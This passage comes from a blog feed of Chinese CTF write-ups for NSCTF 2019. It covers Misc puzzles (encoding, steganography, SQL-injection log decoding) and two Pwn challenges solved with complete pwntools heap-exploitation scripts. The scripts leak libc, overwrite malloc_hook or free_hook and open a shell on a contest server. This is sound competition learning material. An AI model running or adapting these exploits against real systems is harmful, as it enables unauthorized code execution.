data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/2.png" class="lazyload"></a></p><h3 id="flag-1e257b39a25c6a7c4d66e197"><a href="#flag-1e257b39a25c6a7c4d66e197" class="headerlink" title="flag{1e257b39a25c6a7c4d66e197}"></a>flag{1e257b39a25c6a7c4d66e197}</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a  aa a a aa  a a  a a  a a a a a  aa   a a a a a   aa  a aa  a a a      aaaa a a   aa  a aa  a a aa  a  aa  aa a  a a  a a aaa a  aaa   aa  a  a     a  aaaa a a a a   a a a   a a aa  a a a   a  a    a a  aa a a aaa a  aa    aaaa a  aaaa a a a aa  a a aaa a a aa  a  a aa a   a a  aa a a a a  aa a    aa  aaaa a  aaaa a</span><br></pre></td></tr></tbody></table></figure></div><h3 id="解法"><a href="#解法" class="headerlink" title="解法:"></a>解法:</h3><h3 id="将a转为1空格转为0"><a href="#将a转为1空格转为0" class="headerlink" title="将a转为1空格转为0"></a>将a转为1空格转为0</h3><h3 id="然后直接转为十六进制"><a href="#然后直接转为十六进制" class="headerlink" title="然后直接转为十六进制"></a>然后直接转为十六进制</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/3.png" class="lazyload"></a></p><h3 id="然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA"><a href="#然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA" class="headerlink" title="然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======"></a>然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">str1="MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======"</span><br><span class="line">a=base64.b32decode(str1)</span><br><span class="line">str2=""</span><br><span class="line">for i in a:</span><br><span class="line">    str2+=chr(i+5)</span><br><span class="line">print (str2)</span><br></pre></td></tr></tbody></table></figure></div><p>运行程序：flag{S0_so_SO_b0r1ng} </p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a><a href="Naruto.rar">0x2</a></h2><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/4.png" class="lazyload"></a><br><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/5.png" class="lazyload"></a></p><h3 id="发现ascii解密后为iampass0rd"><a href="#发现ascii解密后为iampass0rd" class="headerlink" title="发现ascii解密后为iampass0rd"></a>发现ascii解密后为iampass0rd</h3><h3 id="然后使用JPHS的seek，并输入上面的密码"><a href="#然后使用JPHS的seek，并输入上面的密码" class="headerlink" title="然后使用JPHS的seek，并输入上面的密码"></a>然后使用JPHS的seek，并输入上面的密码</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/6.png" class="lazyload"></a></p><h3 id="输入密码后，保存文件，然后打开看到flag"><a href="#输入密码后，保存文件，然后打开看到flag" class="headerlink" title="输入密码后，保存文件，然后打开看到flag"></a>输入密码后，保存文件，然后打开看到flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/7.png" class="lazyload"></a></p><h3 id="flag-jphid-is-good"><a href="#flag-jphid-is-good" class="headerlink" title="flag{jphid_is_good}"></a>flag{jphid_is_good}</h3><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a><a href="access.rar">0x3</a></h2><h3 id="Log-analysis"><a href="#Log-analysis" class="headerlink" title="Log analysis"></a>Log analysis</h3><h3 id="将所有带-的字符的数据全部转为对应的ascii"><a href="#将所有带-的字符的数据全部转为对应的ascii" class="headerlink" title="将所有带%的字符的数据全部转为对应的ascii"></a>将所有带%的字符的数据全部转为对应的ascii</h3><h3 id="然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx"><a href="#然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx" class="headerlink" title="然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}"></a>然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}</h3><h3 id="搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来"><a href="#搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来" class="headerlink" title="搜索’}’的ascii即125，然后看到!=,那么就向前搜索带!=的字符串，并且将!=后面的数字取出来"></a>搜索’}’的ascii即125，然后看到!=,那么就向前搜索带!=的字符串，并且将!=后面的数字取出来</h3><h3 id="结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><a href="#结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125" class="headerlink" title="结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125"></a>结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</h3><p>然后写一个转化程序</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include<iostream></iostream></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">int main() {</span><br><span class="line">while (1) {</span><br><span class="line">int c;</span><br><span class="line">scanf("%d", &c);</span><br><span class="line">printf("%c", (char)c);</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><a href="#然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125" class="headerlink" title="然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125"></a>然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</h3><h3 id="即可拿到flag"><a href="#即可拿到flag" class="headerlink" title="即可拿到flag"></a>即可拿到flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/8.png" class="lazyload"></a></p><h2 id="flag-3287fe300f28e24aefa2d86883832c9f"><a href="#flag-3287fe300f28e24aefa2d86883832c9f" class="headerlink" title="flag{3287fe300f28e24aefa2d86883832c9f}"></a>flag{3287fe300f28e24aefa2d86883832c9f}</h2><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a><a href="Pwn1.rar">0x1</a></h3><h3 id="发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"><a href="#发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出" class="headerlink" title="发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"></a>发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出</h3><h3 id="得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处"><a href="#得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处" class="headerlink" title="得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处"></a>得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input the size:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Input the content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("Input size:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Input new content:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("5.exit")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">payload = p64(0xfbad1880)+p64(0x0)*3+'\x00'</span><br><span class="line">edit(-16,0x28,payload)</span><br><span class="line">sh.recvuntil(24*'\x00')</span><br><span class="line">libc = u64(sh.recv(8))-0x3c36e0</span><br><span class="line">log.success("libc_base -> "+hex(libc))</span><br><span class="line">main_arena = libc + main_arena_offset</span><br><span class="line">one_gadget = libc + 0xf1147</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">add(0xF8,"\x11" * 0xE8)</span><br><span class="line">add(0x68,"\x22" * 0x58)</span><br><span class="line">add(0x18,"\x33" * 0x8)</span><br><span class="line">add(0xF8,"\x44" * 0xE8)</span><br><span class="line">add(0x18,"\x55" * 0x10)</span><br><span class="line">free(0)</span><br><span class="line">edit(2,0x18,'\x00' * 0x10 + p64(0x190))</span><br><span class="line">free(3)</span><br><span class="line">payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">payload += '\x66' * (0x68 - 0x8)</span><br><span class="line">payload += p64(0) + p64(0x21)</span><br><span class="line">payload += '\x77' * 0x18</span><br><span class="line">add(0x270,"a"*0x100)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">free(1)</span><br><span class="line">payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">payload += p64(main_arena - 0x1b-8) + p64(main_arena -0x1b-8)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">add(0x60,"aaaaaaaaa")</span><br><span class="line">add(0x60,"\x00" * 3 + p64(one_gadget))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("39.106.184.130",8089,0)</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/9.png" class="lazyload"></a></p><h2 id="flag-play-w1th-he4p-shrink"><a href="#flag-play-w1th-he4p-shrink" class="headerlink" title="flag{play_w1th_he4p_shrink}"></a>flag{play_w1th_he4p_shrink}</h2><h2 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a><a href="pwn2.rar">0x2</a></h2><h3 id="1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc"><a href="#1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc" class="headerlink" title="1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc"></a>1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc</h3><h3 id="2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"><a href="#2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。" class="headerlink" title="2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用/bin/sh\x00，因为实际操作中，/sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"></a>2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用/bin/sh\x00，因为实际操作中，/sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。</h3><h3 id="3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook"><a href="#3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook" class="headerlink" title="3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook"></a>3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input the size")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def free():</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">def show():</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">def edit(content):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">sh.recvuntil("Input the note")</span><br><span class="line">sh.send(content)</span><br><span class="line">def editName(name):</span><br><span class="line">sh.recvuntil("6.exit")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Please input your name")</span><br><span class="line">sh.send(name)</span><br><span class="line">def init(name):</span><br><span class="line">sh.recvuntil("Please input your name")</span><br><span class="line">sh.send(name)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn1")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line"></span><br><span class="line">#0000000000202090</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">init("a"*0x30)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x18)</span><br><span class="line">editName("a"*0x30 + "\x10")</span><br><span class="line">free()</span><br><span class="line">add(0x18)</span><br><span class="line">editName("a"*0x30 + "\x30")</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil("\n")</span><br><span class="line">main_arena = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 88</span><br><span class="line">libc = main_arena - main_arena_offset</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">unsorted_bin_attack_addr = libc + 0x3C6768</span><br><span class="line">fastbin_attack_addr = unsorted_bin_attack_addr + 0x18 - 0x1b + 0x10</span><br><span class="line">add(0x10)</span><br><span class="line">free()</span><br><span class="line">add(0x68)</span><br><span class="line">free()</span><br><span class="line">add(0x30)</span><br><span class="line">free()</span><br><span class="line">add(0x90)</span><br><span class="line">add(0x20)</span><br><span class="line">editName("a" * 0x30 + "\x30")</span><br><span class="line">free()</span><br><span class="line">add(0x50)</span><br><span class="line">editName("a" * 0x30 + "\x90")</span><br><span class="line">edit('a' * 8 + p64(unsorted_bin_attack_addr))</span><br><span class="line">add(0x30)</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x10)</span><br><span class="line">editName("a" * 0x30 + "\xc0")</span><br><span class="line">free()</span><br><span class="line">add(0x40)</span><br><span class="line">editName("a" * 0x30 + "\xc0")</span><br><span class="line">edit(p64(fastbin_attack_addr))</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x68)</span><br><span class="line">payload = "sh\x00"</span><br><span class="line">payload = payload.ljust(0x30 - 5 - 8,"\x00")</span><br><span class="line">edit(payload + p64(system))</span><br><span class="line">free()</span><br><span class="line">log.success("fastbin_attack_addr: " + hex(fastbin_attack_addr))</span><br><span class="line">log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("39.106.184.130",8090,0)</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/10.png" class="lazyload"></a></p><h2 id="flag-pl4y-with-global-buffer-0verflow"><a href="#flag-pl4y-with-global-buffer-0verflow" class="headerlink" title="flag{pl4y_with_global_buffer_0verflow}"></a>flag{pl4y_with_global_buffer_0verflow}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019国赛线下赛</title>
      <link href="/2019/06/28/CTF-2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2019/06/28/CTF-2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>没有web手的悲剧</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="0x01-babypwn"><a href="#0x01-babypwn" class="headerlink" title="0x01 babypwn"></a>0x01 babypwn</h3><h4 id="附件下载-babypwn"><a href="#附件下载-babypwn" class="headerlink" title="附件下载 babypwn"></a><a href="babypwn">附件下载 babypwn</a></h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 